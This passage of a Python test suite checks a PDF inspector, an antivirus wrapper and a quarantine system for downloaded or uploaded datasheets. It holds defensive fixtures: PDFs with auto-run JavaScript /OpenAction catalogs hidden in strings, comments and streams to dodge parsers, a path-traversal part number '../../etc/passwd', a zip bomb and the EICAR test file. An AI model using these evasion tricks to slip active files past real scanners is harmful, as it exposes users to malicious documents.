    assert r.state == "cannot_inspect" and not r.is_inert


_CATALOG = b"1 0 obj<</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>endobj\n"


def test_an_unclosed_string_cannot_hide_a_later_catalog(tmp_path):
    """Codex, PR #15: an unused object with one unclosed `(` ran the string to
    EOF and the scan stopped, but a reader walking the xref still parses the
    catalog after it from its offset. Unknown, and what follows is still read
    so the verdict carries it. A trailing backslash is the same string."""
    for junk in (b"4 0 obj (never closed endobj\n", b"4 0 obj (x\\"):
        for data in (
            b"%PDF-1.4\n" + junk + _CATALOG + _TAIL,
            b"%PDF-1.4\n" + _CATALOG + _TAIL + junk,
        ):
            r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
            assert r.state == "cannot_inspect" and not r.is_inert, data
            assert "literal string" in r.reason
        r = pdf_inspect.inspect(_write(tmp_path, "b.pdf", b"%PDF-1.4\n" + junk + _CATALOG + _TAIL))
        assert {"OpenAction", "JS"} <= {f.name for f in r.active}, junk
    # Closed strings, nested and escaped ones included, are not held for it.
    data = b"%PDF-1.4\n4 0 obj (a (b) \\) c) endobj\n1 0 obj<</Type/Catalog>>endobj\n" + _TAIL
    assert pdf_inspect.inspect(_write(tmp_path, "c.pdf", data)).state == "inspected"


def test_an_unclosed_string_in_an_object_stream_cannot_hide_the_next_object(tmp_path):
    """The same inside an object stream, where it matters more: a reader finds
    each object at its offset from /First, so object 2 is parsed whatever
    object 1 left open, and this scan stopped at the `(`."""
    inner = b"1 0 2 12 (unclosed    <</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>"
    data = _objstm(b"/Filter/FlateDecode", zlib.compress(inner))
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert r.state == "cannot_inspect" and not r.is_inert
    assert {"OpenAction", "JS"} <= {f.name for f in r.active}


def test_a_stream_keyword_in_an_object_stream_is_unknown(tmp_path):
    """An object stream cannot hold a stream. Taken as one, `stream` blanked
    everything to the next `endstream` (here in a later object's string),
    while a reader parses the catalog whose offset falls inside."""
    inner = b"1 0 2 12 <</A 1>> stream\n<</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>> (endstream)"
    data = _objstm(b"/Filter/FlateDecode", zlib.compress(inner))
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert r.state == "cannot_inspect" and not r.is_inert


def test_a_stream_body_that_never_ends_is_unknown(tmp_path):
    """With no `endstream` the body is tokenized as structure, and its bytes
    steer the tokenizer: a `(` in the data, closed by a stray `)` after the
    catalog, blanked an /OpenAction that a reader using /Length parses."""
    data = (
        b"%PDF-1.4\n4 0 obj<</Length 1>>stream\n(\n" + _CATALOG + b")\n" + _TAIL
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert r.state == "cannot_inspect" and not r.is_inert
    assert "endstream" in r.reason


def test_a_dictionary_still_open_at_eof_is_unbalanced(tmp_path):
    data = b"%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\n" + _TAIL + b"<</Junk 1\n"
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert r.state == "cannot_inspect" and not r.is_inert


def _xref_to(data: bytes, target: bytes) -> bytes:
    """`data` with an xref table naming `target`'s offset as object 1, the
    catalog: where a reader that trusts the xref goes to parse it."""
    xref = b"xref\n0 2\n0000000000 65535 f \n%010d 00000 n \n" % data.index(target)
    return data + xref + b"trailer<</Size 2/Root 1 0 R>>\nstartxref\n%d\n%%%%EOF\n" % len(data)


def test_a_catalog_inside_a_string_or_comment_is_still_read(tmp_path):
    """Codex, PR #15: a balanced string can enclose a whole catalog. The parse
    skipped the string as data, but the xref names the catalog's offset, so a
    reader seeks into the string and parses its /OpenAction; a reader with a
    broken xref finds the header by scanning the file. A comment is the same."""
    for wrap in (
        b"4 0 obj(" + _CATALOG.rstrip() + b")endobj\n",
        b"%" + _CATALOG,
    ):
        data = _xref_to(b"%PDF-1.4\n" + wrap, b"1 0 obj")
        r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
        assert {"OpenAction", "JS"} <= {f.name for f in r.active}, wrap


def test_a_catalog_inside_another_streams_body_is_still_read(tmp_path):
    """Codex, PR #15: the same inside a stream whose direct /Length spans the
    catalog. The parse trusts the span and blanks it; the xref does not care.
    An object stream hidden the same way is decoded like any other."""
    packed = zlib.compress(_HIDDEN)
    for hidden in (
        _CATALOG,
        b"5 0 obj<</Type/ObjStm/N 1/First 4/Filter/FlateDecode/Length %d>>stream\n" % len(packed)
        + packed + b"\nendstream endobj\n",
    ):
        data = _xref_to(
            b"%%PDF-1.4\n4 0 obj<</Length %d>>stream\n" % len(hidden) + hidden + b"\nendstream endobj\n",
            hidden[:7],
        )
        r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
        assert {"OpenAction", "JS"} <= {f.name for f in r.active}, hidden[:20]


def test_an_object_hidden_in_data_that_does_not_end_is_unknown(tmp_path):
    """A header inside a string whose object never reaches `endobj` cleanly
    is what a reader may parse and this cannot read: unknown, not clean."""
    for wrap in (
        b"4 0 obj(1 0 obj<</Type/Catalog/Note\\(>>)endobj\n",   # a string that runs on
        b"4 0 obj(1 0 obj<</Type/Catalog)endobj\n",              # a `<<` never closed
    ):
        data = b"%PDF-1.4\n" + wrap + _TAIL
        r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
        assert r.state == "cannot_inspect", wrap


def test_a_header_a_comment_swallowed_is_read_and_stays_benign(tmp_path):
    """The one place the 77-PDF corpus has a header inside skipped bytes: an
    incremental update appended with no newline after `%%EOF`, so a comment
    holds the catalog's `1 0 obj`. It is read like any object, and a benign
    catalog stays inspected."""
    data = (
        b"%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\n" + _TAIL.rstrip(b"\n")
        + b"1 0 obj\r<</Type/Catalog/Lang(zh)/MarkInfo<</Marked true>>>>\rendobj\r" + _TAIL
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert r.state == "inspected" and r.is_inert, (r.reason, [f.name for f in r.findings])


def test_many_headers_inside_one_string_cost_little(tmp_path):
    """Each hidden object is parsed once and stops at the next `obj`, so a
    string of a hundred thousand headers is linear work, not quadratic."""
    import time

    data = b"%PDF-1.4\n4 0 obj(" + b"1 0 obj " * 100_000 + b"1 0 obj<</A 1>>endobj)endobj\n" + _TAIL
    t = time.monotonic()
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert time.monotonic() - t < 20
    assert r.state == "inspected" and r.is_inert, r.reason


def test_a_line_of_comment_gaps_costs_little(tmp_path):
    """Finding `N G obj V endobj` with comments allowed between the tokens was
    a regex that tried every digit as a start and scanned the comment after
    it to the end of its line each time. A megabyte of `1 % obj ` on one line
    took about twenty minutes. Found from each `obj` and walked back, it is
    linear. The length still resolves when the comments are real gaps."""
    import time

    data = b"%PDF-1.4\n4 0 obj(" + b"1 % obj " * 125_000 + b")endobj\n" + _TAIL
    t = time.monotonic()
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert time.monotonic() - t < 10
    assert r.state == "inspected" and r.is_inert, r.reason
    define = b"6 %x 1 %y\n0 %z\nobj % a\n%b\n" + str(len(_CONTENT)).encode() + b" %c\nendobj\n"
    r = pdf_inspect.inspect(_write(tmp_path, "b.pdf", _content_stream(b"6 0 R", define)))
    assert r.state == "inspected" and r.is_inert, [f.name for f in r.findings]


def test_a_comment_is_whitespace_in_an_indirect_length(tmp_path):
    """Codex, PR #15: comments are lexical whitespace, but the length pattern
    allowed only whitespace, so `6 0 obj % comment` left the reference
    unresolved, the body was cut at the `endstream` in its text, and a benign
    `/JS` in it held the file."""
    n = str(len(_CONTENT)).encode()
    for define in (
        b"6 0 obj % the length\n" + n + b"\nendobj\n",
        b"6%a\r0%b\robj%c\n+" + n + b"%d\nendobj\n",
        b"6 0 obj\n%%%%\n" + n + b" % done\r\nendobj\n",
    ):
        r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", _content_stream(b"6 0 R", define)))
        assert r.state == "inspected" and r.is_inert, (define, [f.name for f in r.findings])


def test_a_comment_before_endstream_still_honours_the_declared_length(tmp_path):
    """The same whitespace rule after a body: a reader's lexer skips a comment
    between the body and `endstream`. Missed, a direct /Length looked wrong,
    the body was cut at an `endstream` inside the compressed bytes, and a
    benign object stream was held as undecodable."""
    body = _deflate_hiding_endstream(b"1 0 <</Type/Catalog>>")
    data = (
        b"%PDF-1.5\n5 0 obj<</Type/ObjStm/N 1/First 4/Filter/FlateDecode/Length "
        + str(len(body)).encode() + b">>stream\n"
        + body + b"\n% end of body\nendstream endobj\n" + _TAIL
    )
    assert pdf_inspect.inspect(_write(tmp_path, "a.pdf", data)).state == "inspected"


def test_encrypt_in_a_thumbnail_is_not_encryption(tmp_path):
    data = (
        b"%PDF-1.4\n2 0 obj<</Type/Metadata/Subtype/XML>>stream\nAb/Encrypt/Zz\nendstream endobj\n"
        b"trailer<</Root 1 0 R>>\n%%EOF\n"
    )
    assert pdf_inspect.inspect(_write(tmp_path, "a.pdf", data)).state == "inspected"


def test_an_encrypted_pdf_is_unknown_rather_than_clean(tmp_path):
    """Its streams cannot be read, so there is nothing to match. Reporting that
    as clean would be the single most misleading thing this module could do."""
    r = pdf_inspect.inspect(
        _write(tmp_path, "a.pdf", b"%PDF-1.4\ntrailer<</Root 1 0 R/Encrypt 9 0 R>>\n%%EOF\n")
    )
    assert r.state == "cannot_inspect"
    assert not r.is_inert


def test_something_that_is_not_a_pdf_says_so(tmp_path):
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", b"MZ\x90\x00 a PE binary"))
    assert r.state == "not_a_pdf"
    assert not r.is_inert


def test_a_zip_bomb_costs_a_few_megabytes_not_the_machine(tmp_path):
    """A stream that inflates to gigabytes is not a datasheet's structure."""
    # Terminated: a body with no `endstream` is unknown in its own right (see
    # test_a_stream_body_that_never_ends_is_unknown), and this is about cost.
    bomb = (
        b"%PDF-1.5\n1 0 obj<</Filter/FlateDecode>>stream\n" + zlib.compress(b"\0" * (64 << 20))
        + b"\nendstream endobj\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", bomb))
    assert r.state == "inspected"


# -- whether the file is known bad -------------------------------------------


def test_no_scanner_means_unscanned_and_never_clean(monkeypatch):
    """The invariant the whole optional-scanner arrangement rests on. If these
    ever collapse, the ledger fills with ticks that mean 'nobody looked'."""
    monkeypatch.delenv("BLPL_CLAMD_SOCKET", raising=False)
    monkeypatch.delenv("BLPL_CLAMD_HOST", raising=False)
    r = av.scan_bytes(b"anything")
    assert r.state == "unscanned"
    assert not r.is_clean


def test_an_unreachable_scanner_is_unscanned_not_clean(monkeypatch):
    """A daemon that quietly died must show up as files nobody checked, not as
    files that passed."""
    monkeypatch.setenv("BLPL_CLAMD_HOST", "127.0.0.1")
    monkeypatch.setenv("BLPL_CLAMD_PORT", "1")     # nothing listens here
    r = av.scan_bytes(b"anything")
    assert r.state == "unscanned"
    assert not r.is_clean
    assert not av.available()


# -- the two questions, kept apart -------------------------------------------


def _no_scanner(monkeypatch):
    monkeypatch.delenv("BLPL_CLAMD_SOCKET", raising=False)
    monkeypatch.delenv("BLPL_CLAMD_HOST", raising=False)


def test_a_clean_datasheet_reaches_the_trusted_directory(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    rec = quarantine.accept_and_release(BENIGN, tmp_path, mpn="TPS62840")
    assert rec.state == quarantine.RELEASED
    assert (tmp_path / "datasheets" / "TPS62840.pdf").is_file()


def test_a_file_that_acts_on_open_is_held_even_when_no_scanner_objects(tmp_path, monkeypatch):
    """The point of keeping the two checks separate. A scanner's silence means
    'not a known threat', which is not the same as 'does nothing'."""
    _no_scanner(monkeypatch)
    rec = quarantine.accept(PHONES_HOME, tmp_path, mpn="EVIL")
    assert rec.state == quarantine.HELD
    assert any("opened" in r for r in rec.reasons)
    assert not (tmp_path / "datasheets").exists()


def test_a_held_file_is_kept_as_evidence_not_deleted(tmp_path, monkeypatch):
    """Which part, which distributor, what was in it. Deleting it destroys the
    record and means the same download happens again tomorrow."""
    _no_scanner(monkeypatch)
    rec = quarantine.accept(PHONES_HOME, tmp_path, mpn="EVIL", distributor="mouser")
    blob = tmp_path / "retrieved" / rec.filename
    assert blob.is_file() and blob.read_bytes() == PHONES_HOME

    row = quarantine.record_for(tmp_path, rec.sha256)
    assert row["distributor"] == "mouser"
    assert row["reasons"]


def test_releasing_a_held_file_is_refused(tmp_path, monkeypatch):
    """The check is cheap; a file with an /OpenAction sitting in the directory
    whose name means 'these are fine' is not."""
    _no_scanner(monkeypatch)
    rec = quarantine.accept(PHONES_HOME, tmp_path, mpn="EVIL")
    with pytest.raises(ValueError):
        quarantine.release(tmp_path, rec)


def test_requiring_a_scan_holds_what_nothing_checked(tmp_path, monkeypatch):
    """Off by default so a deployment without a scanner still works; on, an
    unscanned file does not get in."""
    _no_scanner(monkeypatch)
    monkeypatch.setenv("BLPL_QUARANTINE_REQUIRE_SCAN", "1")
    rec = quarantine.accept(BENIGN, tmp_path, mpn="TPS62840")
    assert rec.state == quarantine.HELD
    assert any("no scanner" in r for r in rec.reasons)


def test_the_ledger_records_every_retrieval_whatever_the_outcome(tmp_path, monkeypatch):
    """So that 'no entry' means 'never fetched' rather than 'fetched and fine'."""
    _no_scanner(monkeypatch)
    quarantine.accept_and_release(BENIGN, tmp_path, mpn="GOOD")
    quarantine.accept(PHONES_HOME, tmp_path, mpn="BAD")
    assert quarantine.summary(tmp_path) == {
        "retrieved": 2, "released": 1, "held": 1, "unscanned": 2,
    }


def test_the_same_file_twice_is_one_entry(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    a = quarantine.accept_and_release(BENIGN, tmp_path, mpn="TPS62840")
    b = quarantine.accept_and_release(BENIGN, tmp_path, mpn="TPS62840")
    assert a.sha256 == b.sha256
    assert quarantine.summary(tmp_path)["retrieved"] == 1


def test_a_quarantined_name_cannot_escape_the_directory(tmp_path, monkeypatch):
    """The MPN reaches the filename, and it comes from a distributor's API."""
    _no_scanner(monkeypatch)
    rec = quarantine.accept(BENIGN, tmp_path, mpn="../../etc/passwd")
    blob = tmp_path / "retrieved" / rec.filename
    assert blob.resolve().parent == (tmp_path / "retrieved").resolve()


def test_an_unreadable_ledger_does_not_read_as_nothing_retrieved(tmp_path, monkeypatch):
    """A truncated ledger must not silently become an empty one — but it must
    also not stop the next retrieval from being recorded."""
    _no_scanner(monkeypatch)
    quarantine.accept(BENIGN, tmp_path, mpn="GOOD")
    (tmp_path / "retrieved" / quarantine.LEDGER_NAME).write_text("{ truncated")
    rec = quarantine.accept(PHONES_HOME, tmp_path, mpn="BAD")
    assert quarantine.record_for(tmp_path, rec.sha256) is not None


# -- the path a real download takes ------------------------------------------


@pytest.fixture
def resolver(tmp_path, monkeypatch):
    """A stand-in for a kicad-happy resolver script.

    It writes whatever bytes the test asks for to the `-o` path and prints the
    JSON the real ones print, so the test exercises our plumbing rather than a
    distributor's.
    """
    from blpl.agent import kicad_happy
    from blpl.agent.tools import parts

    script = tmp_path / "fake_resolver.py"
    payload = tmp_path / "payload.bin"

    script.write_text(
        "import json, sys, pathlib\n"
        "out = sys.argv[sys.argv.index('-o') + 1]\n"
        f"pathlib.Path(out).write_bytes(pathlib.Path({str(payload)!r}).read_bytes())\n"
        "json.dump({'mpn': 'TPS62840', 'manufacturer': 'TI',\n"
        "           'datasheet_url': 'https://ti.com/lit/ds/x.pdf'}, sys.stdout)\n"
    )
    monkeypatch.setattr(parts, "script_path", lambda *a, **k: script)
    monkeypatch.setattr(parts, "DISTRIBUTORS", ("mouser",))
    monkeypatch.setattr(kicad_happy.CredResolver, "missing_for", lambda self, d: [])
    monkeypatch.setattr(kicad_happy.CredResolver, "env_for", lambda self, d: {})
    monkeypatch.delenv("BLPL_CLAMD_SOCKET", raising=False)
    monkeypatch.delenv("BLPL_CLAMD_HOST", raising=False)
    return payload


def test_a_fetched_datasheet_passes_through_quarantine(tmp_path, resolver):
    """End to end: the file never lands in datasheets/ without being looked at
    first, and the caller is told what quarantine made of it."""
    from blpl.agent.tools.parts import fetch_datasheet

    resolver.write_bytes(BENIGN)
    proj = tmp_path / "proj"
    got = fetch_datasheet("TPS62840", proj / "datasheets")

    assert got.ok
    assert Path(got.path).is_file()
    assert Path(got.path).parent.name == "datasheets"
    assert got.quarantine["state"] == quarantine.RELEASED
    # …and the original is still in quarantine, with its provenance.
    assert quarantine.record_for(proj, got.quarantine["sha256"])["distributor"] == "mouser"


def test_a_hostile_datasheet_is_downloaded_and_withheld(tmp_path, resolver):
    """Downloading it is right — you cannot inspect what you did not fetch. What
    changes is that it does not become a project file, and the caller is told
    why rather than being told the part has no datasheet."""
    from blpl.agent.tools.parts import fetch_datasheet

    resolver.write_bytes(PHONES_HOME)
    proj = tmp_path / "proj"
    got = fetch_datasheet("EVIL", proj / "datasheets")

    assert not got.ok
    assert not (proj / "datasheets" / "EVIL.pdf").exists()
    assert got.held and "opened" in got.held[0]["reasons"][0]
    assert "held in quarantine" in got.detail
    assert list((proj / "retrieved").glob("*.pdf"))       # kept as evidence


def test_a_lookup_keeps_the_file_it_already_paid_to_download(tmp_path, resolver):
    """`--search` downloads the PDF as part of answering. Pointing it at
    /dev/null paid for the download — scrape and browser fallbacks included —
    and threw the result away."""
    from blpl.agent.tools.parts import search_parts

    resolver.write_bytes(BENIGN)
    proj = tmp_path / "proj"
    found = search_parts("TPS62840", project_dir=proj)

    assert found.hits
    assert found.retrieved and found.retrieved[0]["state"] == quarantine.RELEASED
    assert (proj / "datasheets" / "TPS62840.pdf").is_file()


def test_a_lookup_with_nowhere_to_put_it_still_works(tmp_path, resolver):
    """Called without a project there is nothing to keep, and the lookup must
    still answer rather than failing over the absence of a destination."""
    from blpl.agent.tools.parts import search_parts

    resolver.write_bytes(BENIGN)
    found = search_parts("TPS62840")
    assert found.hits and found.retrieved == []


def test_the_staging_file_never_appears_under_datasheets(tmp_path, resolver):
    """A partial download sitting under the name that means 'checked' — even for
    a moment, even on a crash — is the state this arrangement exists to
    prevent."""
    from blpl.agent.tools.parts import fetch_datasheet

    resolver.write_bytes(PHONES_HOME)
    proj = tmp_path / "proj"
    fetch_datasheet("EVIL", proj / "datasheets")
    assert list((proj / "datasheets").iterdir()) == []


# -- uploads -----------------------------------------------------------------


def test_an_uploaded_datasheet_is_named_for_its_part(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    rec = quarantine.accept_upload(
        BENIGN, tmp_path, original_name="scan 01.pdf", kind="datasheet",
        uploaded_by="a@example.com", mpn="TPS62840",
    )
    assert rec.state == quarantine.RELEASED
    assert (tmp_path / "datasheets" / "TPS62840.pdf").is_file()
    assert rec.origin == quarantine.UPLOAD
    assert rec.uploaded_by == "a@example.com"
    assert rec.original_name == "scan 01.pdf"


def test_a_reference_keeps_its_name_in_references(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    rec = quarantine.accept_upload(
        BENIGN, tmp_path, original_name="AN-123 layout guide.pdf", kind="reference",
        uploaded_by="a@example.com",
    )
    assert rec.released_to == "references"
    assert (tmp_path / "references" / rec.released_as).is_file()
    assert rec.released_as == "AN-123_layout_guide.pdf"
    assert not (tmp_path / "datasheets").exists()


def test_an_uploaded_pdf_that_acts_on_open_is_held_like_a_fetched_one(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    rec = quarantine.accept_upload(
        PHONES_HOME, tmp_path, original_name="ref.pdf", kind="reference", uploaded_by="a@example.com"
    )
    assert rec.state == quarantine.HELD
    assert not (tmp_path / "references").exists()


def test_pdf_bytes_are_inspected_whatever_the_name_says(tmp_path, monkeypatch):
    """Renaming a hostile PDF to .bin must not route it around the inspector."""
    _no_scanner(monkeypatch)
    rec = quarantine.accept_upload(
        PHONES_HOME, tmp_path, original_name="harmless.bin", kind="reference", uploaded_by="a@x"
    )
    assert rec.state == quarantine.HELD


def test_an_uninspectable_upload_is_released_and_says_it_was_not_inspected(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    rec = quarantine.accept_upload(
        b"ISO-10303-21;\n", tmp_path, original_name="enclosure.STEP", kind="reference", uploaded_by="a@x"
    )
    assert rec.state == quarantine.RELEASED
    assert rec.inspection["state"] == quarantine.NOT_INSPECTED
    assert (tmp_path / "references" / "enclosure.step").is_file()


def test_a_distributor_fetch_of_a_non_pdf_is_still_held(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    rec = quarantine.accept(b"not a pdf", tmp_path, mpn="X", suffix=".zip")
    assert rec.reasons


def test_an_upload_the_scanner_matches_is_held(tmp_path, monkeypatch):
    monkeypatch.setattr(
        quarantine.av, "scan_bytes",
        lambda data: av.ScanResult(state="infected", signature="Eicar-Test-Signature"),
    )
    rec = quarantine.accept_upload(
        EICAR, tmp_path, original_name="x.txt", kind="reference", uploaded_by="a@x"
    )
    assert rec.state == quarantine.HELD
    assert any("Eicar" in r for r in rec.reasons)


def test_a_second_file_with_the_same_name_does_not_replace_the_first(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    a = quarantine.accept_upload(b"one\n", tmp_path, original_name="notes.txt", kind="reference", uploaded_by="a@x")
    b = quarantine.accept_upload(b"two\n", tmp_path, original_name="notes.txt", kind="reference", uploaded_by="a@x")
    assert a.released_as != b.released_as
    assert (tmp_path / "references" / a.released_as).read_bytes() == b"one\n"
    assert (tmp_path / "references" / b.released_as).read_bytes() == b"two\n"


def test_an_unknown_kind_is_refused(tmp_path):
    with pytest.raises(ValueError):
        quarantine.accept_upload(b"x", tmp_path, original_name="x", kind="junk", uploaded_by="a@x")


def test_pdf_bytes_under_another_name_are_released_as_a_pdf(tmp_path, monkeypatch):
    """The resolver looks for <MPN>.pdf; a datasheet saved as .txt is invisible to it."""
    _no_scanner(monkeypatch)
    rec = quarantine.accept_upload(
        BENIGN, tmp_path, original_name="TPS62840 datasheet", kind="datasheet",
        uploaded_by="a@x", mpn="TPS62840",
    )
    assert rec.released_as == "TPS62840.pdf"
    rec = quarantine.accept_upload(
        BENIGN + b"%2\n", tmp_path, original_name="guide.txt", kind="reference", uploaded_by="a@x"
    )
    assert rec.released_as == "guide.pdf"


# -- a datasheet filed under its part ----------------------------------------
#
# The agent's fetch_datasheet tool downloads into datasheets/<MPN>/. The fetcher
# used to infer the project as the parent of that directory — datasheets/ — so
# the quarantine was created at datasheets/retrieved/ (outside the ignore rule,
# and visible to every datasheet lookup), passed files landed in
# datasheets/datasheets/, and "already downloaded" never found them.


def test_a_datasheet_filed_under_its_part_is_quarantined_at_the_project_root(tmp_path, resolver):
    from blpl.agent.tools.parts import fetch_datasheet

    resolver.write_bytes(BENIGN)
    proj = tmp_path / "proj"
    part = proj / "datasheets" / "TPS62840"
    got = fetch_datasheet("TPS62840", part, project_dir=proj)

    assert got.ok
    assert Path(got.path) == part / "TPS62840.pdf"
    assert (proj / "retrieved" / quarantine.LEDGER_NAME).is_file()
    assert not (proj / "datasheets" / "retrieved").exists()
    assert not (proj / "datasheets" / "datasheets").exists()
    # …and the next lookup finds it rather than downloading it again.
    again = fetch_datasheet("TPS62840", part, project_dir=proj)
    assert again.ok and again.distributor == "cache"


def test_a_held_datasheet_filed_under_its_part_stays_out_of_datasheets(tmp_path, resolver):
    from blpl.agent.tools.parts import fetch_datasheet

    resolver.write_bytes(PHONES_HOME)
    proj = tmp_path / "proj"
    got = fetch_datasheet("EVIL", proj / "datasheets" / "EVIL", project_dir=proj)

    assert not got.ok and got.held
    assert list((proj / "retrieved").glob("*.pdf"))
    assert not [p for p in (proj / "datasheets").rglob("*.pdf")]


# -- a held file is never a datasheet ---------------------------------------


def _misplaced_quarantine(proj: Path) -> Path:
    """The layout the bug produced: a held file inside datasheets/retrieved/."""
    held = proj / "datasheets" / "retrieved" / "327429e564bc-LBAA0XV2DT-158.pdf"
    held.parent.mkdir(parents=True)
    held.write_bytes(PHONES_HOME)
    return held


def test_the_resolver_never_offers_a_quarantined_file(tmp_path):
    from blpl.agent.tools import datasheet_files

    proj = tmp_path / "proj"
    _misplaced_quarantine(proj)
    r = datasheet_files.resolve(proj, "LBAA0XV2DT-158")
    assert r.path is None


def test_a_map_row_pointing_into_quarantine_is_refused(tmp_path):
    # What verdacor-ear-tag's datasheets.md actually held.
    from blpl.agent.tools import datasheet_files

    proj = tmp_path / "proj"
    _misplaced_quarantine(proj)
    datasheet_files.record(proj, "LBAA0XV2DT-158", "retrieved/327429e564bc-LBAA0XV2DT-158.pdf")
    r = datasheet_files.resolve(proj, "LBAA0XV2DT-158")
    assert r.path is None
    assert "quarantine" in r.detail


def test_naming_a_quarantined_file_explicitly_is_refused(tmp_path):
    from blpl.agent.tools import datasheet_files

    proj = tmp_path / "proj"
    _misplaced_quarantine(proj)
    r = datasheet_files.resolve(
        proj, "LBAA0XV2DT-158", file="retrieved/327429e564bc-LBAA0XV2DT-158.pdf"
    )
    assert r.path is None


# -- the same decision for bytes that arrive another way ---------------------


def test_assess_decides_as_accept_does_without_storing(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    assert quarantine.assess(BENIGN, is_pdf=True).reasons == []
    held = quarantine.assess(PHONES_HOME, is_pdf=True)
    assert held.reasons == quarantine.accept(PHONES_HOME, tmp_path, mpn="X").reasons


def test_a_symlink_into_quarantine_is_not_a_datasheet(tmp_path):
    # Codex P2 on #8: a link under datasheets/ pointing at ../retrieved/<held>
    # resolved outside datasheets/, and that was taken to mean "not quarantined".
    from blpl.agent.tools import datasheet_files

    proj = tmp_path / "proj"
    held = proj / "retrieved" / "327429e564bc-LBAA0XV2DT-158.pdf"
    held.parent.mkdir(parents=True)
    held.write_bytes(PHONES_HOME)
    (proj / "datasheets").mkdir()
    (proj / "datasheets" / "LBAA0XV2DT-158.pdf").symlink_to(held)

    assert datasheet_files.resolve(proj, "LBAA0XV2DT-158").path is None
    assert datasheet_files.resolve(proj, "LBAA0XV2DT-158", file="LBAA0XV2DT-158.pdf").path is None
